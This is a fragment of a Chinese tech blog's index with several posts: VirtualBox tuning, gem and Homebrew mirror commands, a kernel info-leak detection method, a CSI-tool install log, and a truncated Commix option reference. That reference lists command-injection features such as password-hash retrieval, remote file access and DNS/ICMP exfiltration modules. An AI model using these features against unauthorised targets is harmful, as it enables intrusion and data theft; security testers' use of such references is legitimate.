      <link href="/2017/01/22/%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80/"/>
      <url>/2017/01/22/%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>怎么可以让你的虚拟机运行的更快呢？</p><h4 id="1、开启CPU的硬件虚拟化功能"><a href="#1、开启CPU的硬件虚拟化功能" class="headerlink" title="1、开启CPU的硬件虚拟化功能"></a>1、开启CPU的硬件虚拟化功能</h4><p>现在的CPU几乎都支持硬件虚拟化功能，英特尔称之为VT-x技术，AMD称之为AMD-V技术。在百度搜索你的笔记本型号或主板型号+开启虚拟化，就可以找到相应的开启方法。一般是开机进入bios，然后找到虚拟化技术的选项，将disabled改为enabled。据我所知，用英特尔CPU的电脑，虚拟化技术的选项名称大概含有“virtualization technology”的字眼。</p><p>BIOS开启成功后，在虚拟机的设置中，启用硬件加速。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-1.png" alt="1"></p><p>当你成功开启硬件虚拟化功能时，虚拟机的窗口右下角有一个蓝色V的图标，鼠标移上去就会提示成功开启。</p><h4 id="2、给虚拟机分配足够的内存"><a href="#2、给虚拟机分配足够的内存" class="headerlink" title="2、给虚拟机分配足够的内存"></a>2、给虚拟机分配足够的内存</h4><p>既然本机有4GB的内存，那么可以分配1GB供虚拟机上的Ubuntu使用。内存大小根据虚拟机系统的需要来定，如果你跑XP，那么分配512MB已经很足够了。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-2.png" alt="2"></p><h4 id="3、开启3D加速，分配足够显存"><a href="#3、开启3D加速，分配足够显存" class="headerlink" title="3、开启3D加速，分配足够显存"></a>3、开启3D加速，分配足够显存</h4><p>笔者觉得当初Ubuntu界面卡顿很有可能跟显卡方面的设置有关。于是开启了3D加速，分配了32MB的显存给VirtualBox。性能提升很明显。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-3.png" alt="3"></p><h4 id="4、安装VirtualBox增强功能"><a href="#4、安装VirtualBox增强功能" class="headerlink" title="4、安装VirtualBox增强功能"></a>4、安装VirtualBox增强功能</h4><p>启动虚拟机。单击虚拟机菜单中的“设备”&gt;“安装增强功能”，也可以按快捷键Host+D。Host键就是虚拟机窗口右下方显示的键，默认为Right Ctrl，即右边的Ctrl键。然后系统会加载增强功能所在的虚拟光盘。点击运行，按提示完成安装，重启虚拟机。</p><h4 id="5、电脑的核心都挺多的"><a href="#5、电脑的核心都挺多的" class="headerlink" title="5、电脑的核心都挺多的"></a>5、电脑的核心都挺多的</h4><p>多分个核就好了。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>gem更换国内源</title>
      <link href="/2017/01/22/gem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90/"/>
      <url>/2017/01/22/gem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">gem sources -l</div><div class="line"></div><div class="line">#移除https://rubygems.org源</div><div class="line"></div><div class="line">gem sources --remove https://rubygems.org/</div><div class="line"></div><div class="line">#增加https://gems.ruby-china.org/源</div><div class="line"></div><div class="line">gem sources -a https://gems.ruby-china.org/</div><div class="line"></div><div class="line">#更新缓存</div><div class="line"></div><div class="line">gem sources -u</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>替换homebrew默认源</title>
      <link href="/2017/01/22/%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90/"/>
      <url>/2017/01/22/%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90/</url>
      <content type="html"><![CDATA[<p>网上搜的好多都不能用了，但是这个是可以的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd &quot;$(brew --repo)&quot;</div><div class="line">git remote set-url origin git://mirrors.ustc.edu.cn/brew.git</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Linux内核info leak漏洞</title>
      <link href="/2017/01/22/Linux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E/"/>
      <url>/2017/01/22/Linux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>摘要: 介绍一种Linux内核的信息泄漏漏洞检测方法。没什么内容，语义分析，可以集成在Coverity等静态扫描工具中。</p><h4 id="1-Information-Leak漏洞风险"><a href="#1-Information-Leak漏洞风险" class="headerlink" title="1  Information Leak漏洞风险"></a>1  Information Leak漏洞风险</h4><p>从应用层软件，到hypervisor再到kernel代码，都存在Information <strong>Leak</strong>的风险。下面给出一些示例：</p><p>应用层软件：通常是应用敏感数据泄漏，比如从远程客户端获取服务端敏感数据。CVE-2012-0053，Openssl的心脏滴血等。</p><p>Hypervisor：主要是向guest泄漏hypervisor数据。CVE-2010-4525.</p><p>Kernel代码：泄漏内核地址，空间布局等，如CVE-2013-2147.</p><p>这里主要分析内核中的Information <strong>Leak</strong>漏洞所带来的风险。内核中的Information <strong>Leak</strong>通常都是用来绕过内核中的保护机制（利用缓解：StackGuard, ASLR），由于本身并不能直接用来形成提权等高风险操作，因此Information <strong>Leak</strong>漏洞经常被人忽视。</p><p>先来看一下这些保护机制。</p><p>StackGuard.</p><p>StackGuard是一种编译器实现的保护技术，它在栈函数返回地址前插入一个“canary”，当发生溢出“canary”值被破坏，将触发系统的异常处理流程。它的安全性依赖于“canary”的保密，也就是“canary”不能被攻击者预测或取到。</p><p>ASLR.</p><p>ASLR技术是将进程等的加载地址随机化，它的安全性依赖于加载基地址的不可预测，使exploit不能精确进行地址覆盖。</p><p>无论“canary”还是ASLR的基地址，对攻击者来说都是“秘密”。也就是在没有Information <strong>Leak</strong>漏洞前提下，这些都是用户不可直接获取的。但Information <strong>Leak</strong>漏洞可以辅助攻击者获取到这些“秘密”，进而绕过内核中的保护机制，成功实现漏洞利用。</p><h4 id="2-Information-Leak漏洞分类"><a href="#2-Information-Leak漏洞分类" class="headerlink" title="2  Information Leak漏洞分类"></a>2  Information Leak漏洞分类</h4><p>根据漏洞成因，可以对Information <strong>Leak</strong>漏洞进行分类。这里同样只关注内核中的情况。</p><p>字节对齐带来的内存“空洞”.</p><p>为了程序性能，编译器在编译代码时会对变量进行字节对齐，从而引入了一些内存“空洞”。比如结构体使用sizeof计算的大小一般会大于各个成员占用空间大小的和。当这些内核中的内存“空洞”没有被初始化（ABI没有规定函数退栈时要清理这些栈空间），通过copy_to_user等函数拷贝到用户空间时，就会造成Information <strong>Leak</strong>漏洞，泄漏内核栈中的数据，比如泄漏了一个栈上指针，就可以通过它来计算进程基址（stackjack攻击）。</p><p>缺少变量初始化.</p><p>内核函数中的本地变量声明后，默认不会被初始化。根据C99描述这块空间的内容是不确定的。实际上栈空间是被各函数复用的，因此未初始化变量的内容很可能保存的是上个函数栈上的数据。</p><p>缺少对用户读操作的检查.</p><p>当向用户空间拷贝数据时，没有做大小检查或者检查逻辑出现错误，都会导致Information <strong>Leak</strong>。这类漏洞通常称作“越界读”，它允许用户态读取不应该被访问的内核空间数据。</p><p>其它bug导致的infoleaks.</p><p>其它的Information <strong>Leak</strong>原因这里不做研究，但提一下。比如/proc/,/sys/和/boot/文件系统中也提供了内核符号地址，它们已经靠kptr_restrict机制保护，但也可能因为bug而绕过。另外系统缓存，日志等都有可能导致Information <strong>Leak</strong>.</p><p>上面说到Information <strong>Leak</strong>可能危害保证StackGuard和ASLR可靠基础的“秘密”，下面分析一下内核中的Information <strong>Leak</strong>确切会影响哪些数据。</p><p>Data段.</p><p>内核中的data段保存了编译时就确定的全局变量，data段的泄漏可能导致静态内核symbols的泄漏，比如某些用于配置的变量。</p><p>栈</p><p>内核栈是根据ABI约定，运行时分配的。里面包含了函数返回地址，栈指针和一些其它数据。比如函数调用的参数，StackGuard机制的“canary”等。另外如果没有实现栈地址随机化，还会泄漏栈布局。</p><p>堆</p><p>内核中的堆是由内存分配器管理，在需要的地方动态分配。这些堆分配器通常使用双向链表来管理这些堆内存。Information <strong>Leak</strong>会漏洞这些堆存储的内容，还有可能泄漏用于堆管理的结构数据。</p><h4 id="3-栈的Information-Leak漏洞检测技术"><a href="#3-栈的Information-Leak漏洞检测技术" class="headerlink" title="3  栈的Information Leak漏洞检测技术"></a>3  栈的Information Leak漏洞检测技术</h4><p>分析目前的漏检测技术，发现通过数据流分析的方法，可以对Information <strong>Leak</strong>进行建模来进行漏洞检测。在模型里定义3个基本元素：数据源，数据接收方和传播路径。</p><p>我们可以对程序进行语义分析来匹配这套模型，从而识别漏洞。语义分析这个工作，选用开源的Coccinelle工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">handler(...) &#123;</div><div class="line"></div><div class="line"> &lt;...</div><div class="line"></div><div class="line"> T ID;</div><div class="line"></div><div class="line"> ... when != memset(&amp;ID, 0, ...)</div><div class="line"></div><div class="line"> when != ID = ...</div><div class="line"></div><div class="line">* copy_to_user(EV, &amp;ID, EN)</div><div class="line"></div><div class="line"> ...&gt;&#125;</div></pre></td></tr></table></figure><p>1)  数据源：ID变量</p><p>2)  数据接收方：用户态指针EV</p><p>3)  传播路径：我们想确定ID的内容没有被初始化。因此限定条件，ID在copy_to_user前没有memset()或初始化操作</p><p>像其它基于数据流的静态检测技术类似，这种方法也存在缺陷。比如这种Information <strong>Leak</strong>检测方法假定漏洞发生在一个函数内的，因此这种方法覆盖不了多函数场景。但实际测试中，依然会发现很多Linux内核和三方Driver的Information <strong>Leak</strong>漏洞。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>linux-csi-tools部署记录</title>
      <link href="/2017/01/21/linux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/"/>
      <url>/2017/01/21/linux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<p>我采用<a href="http://dhalperi.github.io/linux-80211n-csitool/old_installation.html" target="_blank" rel="external">old installation instruction</a> 的方法，并对里面个别几个地方有所修改，以适应国内有墙的现状。<br>参考了一部分<a href="http://blog.csdn.net/sodleave/article/details/44219291" target="_blank" rel="external">这个博客</a>。<br>打开终端把代码复制到终端运行即可。</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>我安装了Ubuntu10.04 desktop-i386版，使用的是刻录光盘镜像的方法，大家也可以制作启动u盘或者用虚拟机安装到物理硬盘（我最喜欢的方式）。注意/home分区要留足够的空间（建议10gb以上），/分区也要足够大，建议5gb以上。其他部分很简单，按照安装包的指示一步步来就可以。因为要编译新内核，根目录空间不足的话会不成功。<br>安装的时候注意几个问题，linux碎片化严重，用不受支持的linux发行版或版本会导致编译失败，非常令人头疼。而ubuntu lts版支持时间也不长，安装软件的话如果apt用不了可以试着去百度或launchpad找deb包。</p><p>到<a href="https://github.com/dhalperi/linux-80211n-csitool/" target="_blank" rel="external">对方提供的github网址</a>里面，下载源代码，到右栏可以找到download zip file，下载完毕之后解压放到～/下面，文件夹改名为linux-80211n-csitool<br>（放到别的地方也可以，不过需要修改下面每一条引用它的代码），由于国内网络环境不好，文件过大，用git clone的话及其容易失败，其他的小文件没关系，大家自己解决vpn吧，到网上搜索linvpn应该可以用一阵子，不过ubuntu的vpn设置方面有几点需要注意，百度上面也有介绍。<br><strong>现在比较好用的解决网络问题的方案是lantern和hosts</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/modprobe.d/blacklist.conf</div></pre></td></tr></table></figure><p>把下面内容粘贴进去，保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># blacklist modules under active development</div><div class="line">        blacklist iwldvm</div><div class="line">        blacklist iwlwifi</div><div class="line">        blacklist mac80211</div><div class="line">        blacklist cfg80211</div></pre></td></tr></table></figure><p>该步骤是为了禁止wifi，这样做的目的是让安装驱动的时候不容易出问题</p><h4 id="Install-necessary-packages-on-Ubuntu"><a href="#Install-necessary-packages-on-Ubuntu" class="headerlink" title="Install necessary packages on Ubuntu"></a>Install necessary packages on Ubuntu</h4><p>安装内核组件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get -y install git-core kernel-package fakeroot build-essential ncurses-dev</div></pre></td></tr></table></figure><p>它们是用来编译用户空间工具的库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get -y install libnl-dev libssl-dev    # Install some necessary libraries</div></pre></td></tr></table></figure><p>iw可以用来在命令行界面开启wifi的监控模式和开启40mhz信道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get -y install iw</div></pre></td></tr></table></figure><h4 id="Download-configure-compile-and-install-our-custom-Linux-kernel"><a href="#Download-configure-compile-and-install-our-custom-Linux-kernel" class="headerlink" title="Download, configure, compile, and install our custom Linux kernel"></a>Download, configure, compile, and install our custom Linux kernel</h4><p>下载附加的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/dhalperi/linux-80211n-csitool-supplementary.git</div></pre></td></tr></table></figure><p>设置内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd linux-80211n-csitool                 # Go into the kernel src directory</div><div class="line">make oldconfig                          # Use our optimized kernel config</div><div class="line">make menuconfig                         # Enable your system-specific hardware</div></pre></td></tr></table></figure><p>编译内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">make -j3 bzImage modules                # -j3 here is 3-way parallelism, try #cores+1</div><div class="line">sudo make install modules_install       # INSTALL</div><div class="line">sudo mkinitramfs -o /boot/initrd.img-`cat include/config/kernel.release` \</div><div class="line">        `cat include/config/kernel.release`     # create ramdisk used to boot</div><div class="line">sudo update-grub</div></pre></td></tr></table></figure><p>我在这些步骤里面出现了编译错误的情况，原因是里面的一些头文件和源代码文件名大小写不一致，解决方法是想办法把它复制一下，然后改成大小写一致的文件名（原来的不要删掉）</p><p><del>在一篇csdn blog里面，有人还这么说，如果编译出错，可以试着按照这里来做（关于这一部分，先在窗口输入cat include/config/kernel.release（注意是在 linux-80211n-csitool目录下）获取版本号，一般为3.5.7-csitool。将上述指令改为：sudo mkinitramfs -o /boot/initrd.img-3.5.7-csitool 3.5.7-csitool （注意空格）即可。后续的指令中均要将‘cat include/config/kernel.release’改为3.5.7-csitool）<strong>然而这个方法并不好用</strong></del></p><p>下面安装头文件，记录csi的软件需要用它来编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo mkdir /usr/src/linux-headers-`cat include/config/kernel.release`</div><div class="line">sudo cp -rf usr/include /usr/src/linux-headers-`cat include/config/kernel.release`/include</div></pre></td></tr></table></figure><p>编译成功之后重启，就会进入修改过的内核</p><h4 id="Install-our-custom-firmware"><a href="#Install-our-custom-firmware" class="headerlink" title="Install our custom firmware."></a>Install our custom firmware.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/modprobe.d/blacklist.conf</div></pre></td></tr></table></figure><p>这一步把blacklist iwlwifi删掉，否则无法连接wifi，删掉之后只能连接没密码的wifi。<br>运行下面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#backup original firmware, good for reference</div><div class="line">sudo cp /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig</div><div class="line">sudo mv /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig</div><div class="line"># copy ours in separately, keeping name for reference</div><div class="line">sudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/</div><div class="line"># install ours</div><div class="line">sudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/iwlwifi-5000-2.ucode</div></pre></td></tr></table></figure><p>这一步也有点小问题，这里面的文件名可能是有些小问题，如果出错的话，把固件改名，复制到该文件夹里。<br>我的电脑里面iwlwifi系列如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">iwlwifi-1000-3.ucode    iwlwifi-5000-2.ucode.orig</div><div class="line">iwlwifi-3945-2.ucode    iwlwifi-5000-2.ucode.sigcomm2010</div><div class="line">iwlwifi-4965-2.ucode    iwlwifi-5150-2.ucode</div><div class="line">iwlwifi-5000-1.ucode.orig    iwlwifi-6000-4.ucode</div><div class="line">iwlwifi-5000-2.ucode</div></pre></td></tr></table></figure><h4 id="Download-and-compile-hostap"><a href="#Download-and-compile-hostap" class="headerlink" title="Download and compile hostap"></a>Download and compile hostap</h4><p>At the time of writing, hostap 0.7 is the stable version.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cd                                              # Back out of the kernel tree</div><div class="line">git clone git://w1.fi/srv/git/hostap-07.git     # Get the code</div><div class="line">cd hostap-07/hostapd</div><div class="line">cp &lt;hostap-dotconfig&gt; .config                   # Our hostap config from linux-80211n-csitool-supplementary/hostap-config-files/</div><div class="line">make</div><div class="line">cp &lt;hostapd.conf-test&gt; hostapd.conf             # Install the vanilla hostap conf we provide</div></pre></td></tr></table></figure><p>这一步没有问题，安装hostapd，把电脑当作access point，功能相当于无线路由器，也可以直接用路由器，省略这一步</p><h4 id="Install-the-userspace-logging-utility"><a href="#Install-the-userspace-logging-utility" class="headerlink" title="Install the userspace logging utility"></a>Install the userspace logging utility</h4><p>The userspace netlink tool that logs CSI is located in the supplementary material git at linux-80211n-csitool-supplementary/netlink/.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd ~/linux-80211n-csitool-supplementary/netlink         # We assume you install into your home directory</div><div class="line">make                                                    # hopefully the make succeeds!</div><div class="line"># If not, figure out why it didn&apos;t compile. Did you install the Linux headers above?</div></pre></td></tr></table></figure><p>编译hostap，实际上这个不编译也没关系，因为有路由器或者安桌手机就可以充当ap</p><h4 id="Let’s-try-it-out"><a href="#Let’s-try-it-out" class="headerlink" title="Let’s try it out!"></a>Let’s try it out!</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo modprobe iwlwifi   # did it work?  Do you see logs about iwlwifi in the dmesg?</div><div class="line">sudo iwlist scanning    # 扫描ap，窗口中会出现可以扫描到的无线网络。</div><div class="line">sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf</div><div class="line"># 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错</div></pre></td></tr></table></figure><p>测试hostap时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf</div></pre></td></tr></table></figure><p>是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错：<br>所以执行该命令前必须将无线网络连接断开，此时作为路由功能开启(出现结果)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">using interface wlan0 with hwaddr 00:21:6a:35:4f:00 and ssid &apos;csitool-test&apos;</div><div class="line">wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:authenticated</div><div class="line">wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:associated(aid 1)</div></pre></td></tr></table></figure><p>手机可以连上‘csitool-test’的网络，状态一直是正在获取ip<br>Make sure to kill hostapd when you’re done. Then put 802.11n-enabled hostapd config file in place:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp &lt;hostapd.conf-real&gt; hostapd.conf             # Install the real hostap conf we provide</div></pre></td></tr></table></figure><p>采集csi数据部分（关闭本机电脑作为路由的功能，保证连无线网的功能即可，用另一台电脑开启hostapd作为ap）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo rmmod iwlwifi mac80211 cfg80211        # remove the modules</div><div class="line">sudo modprobe iwlwifi connector_log=0x1      #load the modules and set userspace beamforming logging</div><div class="line">#first,associate and set up IP to an AP that will send you HT packets</div><div class="line">#需要用另外一台电脑作为ap并设置好IP地址，当前电脑连上那个ap</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/linux-80211n-csitool-supplementary/netlink</div><div class="line">sudo ./log_to_file tmp.dat                   #当前电脑相当于dp（探测点），log_to_file tmp.dat可以记录csi的值</div></pre></td></tr></table></figure><p>再打开另一个终端（命令行窗口）ping ，ping所连ap的ip地址，ping多次过后便会有csi数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo rmmod iwlwifi mac80211 cfg80211 </div><div class="line">sudo modprobe iwlwifi connector_log=0x1</div><div class="line">cd ~/wifil/netlink</div><div class="line">sudo ./log_to_file  &lt;地址/文件名&gt;</div></pre></td></tr></table></figure><p>最后，使用该软件的时候，现一行一行地把上面代码部分粘贴到terminal里面，再连接没密码的wifi，然后再打开另一个terminal，ping 该ap的ap地址就可以运行<br>另外，安卓手机ping的ap地址是192.168.43.1<br>用路由器的话设置成接入点模式。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Commix命令详解</title>
      <link href="/2017/01/21/Commix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
      <url>/2017/01/21/Commix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>项目地址：<a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a></p><p>Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">选项：</div><div class="line">    -v 　　　　　　　　　　VERBOSE详细程度级别（0-1，默认值：0）。</div><div class="line">    --version　　　　 　　显示版本号并退出。</div><div class="line">    --output-dir=.. 　　设置自定义输出目录路径。</div><div class="line">    -s SESSION_FILE　　 从存储（.sqlite）文件加载会话。</div><div class="line">    --flush-session　　 刷新当前目标的会话文件。</div><div class="line">    --ignore-session　　忽略存储在会话文件中的结果。</div><div class="line"></div><div class="line">  目标：</div><div class="line">    -u URL，--url = URL　　目标URL。</div><div class="line">    --url-reload　　　　　　在命令执行后重新加载目标URL。</div><div class="line">    -l LOGFILE　　　　　　　解析来自HTTP代理日志文件的目标和数据。</div><div class="line">    --crawl = CRAWLDEPTH  从目标网址开始抓取网站（1-2，默认值：0）。</div><div class="line"></div><div class="line">  请求：</div><div class="line">    --data=DATA　　　　　　要通过POST发送的数据字符串。</div><div class="line">    --host=HOST 　　　　　 HTTP主机头。</div><div class="line">    --referer=REFERER 　　HTTP Referer标头。</div><div class="line">    --user-agent=AGENT 　HTTP用户代理头。</div><div class="line">    --random-agent　　　　使用随机选择的HTTP User-Agent头。</div><div class="line">    --param-del=PDEL　　 设置分割参数值的字符。</div><div class="line">    --cookie=COOKIE 　　 HTTP Cookie头。</div><div class="line">    --cookie-del=CDEL 　 设置分割cookie值的字符。</div><div class="line">    --headers=HEADERS　  额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。</div><div class="line">    --proxy=PROXY　　　　 使用HTTP代理（例如“127.0.0.1:8080”）。</div><div class="line">    --tor　　　　　　　　　 使用Tor网络。</div><div class="line">    --tor-port=...  　　  设置Tor代理端口（默认值：8118）。</div><div class="line">    --auth-url=...　　　  登录面板URL。</div><div class="line">    --auth-data =AUTH 　　登录参数和数据。</div><div class="line">    --auth-type =AUTH 　　HTTP认证类型（例如“基本”或“摘要”）。</div><div class="line">    --auth-cred =AUTH 　　HTTP身份验证凭据（例如“admin：admin”）。</div><div class="line">    --ignore-401　　　　　 忽略HTTP错误401（未授权）。</div><div class="line">    --force-ssl　　　　　　强制使用SSL / HTTPS。</div><div class="line"></div><div class="line">  枚举：</div><div class="line">    这些选项可用于枚举目标主机。</div><div class="line">    --all　　　　　　　　　　　　检索一切。</div><div class="line">    --current-user　　　　　　 检索当前用户名。</div><div class="line">    --hostname　　　　　　　　　检索当前主机名。</div><div class="line">    --is-root　　　　　　　　　 检查当前用户是否具有root权限。</div><div class="line">    --is-admin　　　　　　　　　检查当前用户是否具有管理员权限。</div><div class="line">    --sys-info　　　　　　　　　检索系统信息。</div><div class="line">    --users　　　　　　　　　　 检索系统用户。</div><div class="line">    --passwords　　　　　　　　 检索系统用户密码散列。</div><div class="line">    --privileges　　　　　　　 检索系统用户权限。</div><div class="line">    --ps-version　　　　　　　 检索PowerShell的版本号。</div><div class="line"></div><div class="line">  文件访问：</div><div class="line">    这些选项可用于访问目标主机上的文件。</div><div class="line">    --file-read = FILE ..　　从目标主机读取文件。</div><div class="line">    --file-write = FIL ..　　写入目标主机上的文件。</div><div class="line">    --file-upload = FI ..　　在目标主机上上传文件。</div><div class="line">    --file-dest = FILE ..　　写入和/或上传到的主机的绝对文件路径。</div><div class="line"></div><div class="line">  模块：</div><div class="line">    这些选项可用于增加检测和/或注射能力。</div><div class="line">    --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;注入模块。  （例如&apos;ip_src = 192.168.178.1，ip_dst = 192.168.178.3&apos;）。</div><div class="line">    --dns-server = DNS ..“DNS exfiltration”注入模块。　　（用于DNS筛选攻击的域名）。</div><div class="line">    --shellshock“炮弹”注射模块。</div><div class="line">  注射：</div><div class="line">    这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。</div><div class="line">    -p TEST_PARAMETER　　　　可测试参数。</div><div class="line">    --suffix = SUFFIX　　　　注入有效负载后缀字符串。</div><div class="line">    --prefix = PREFIX　　　　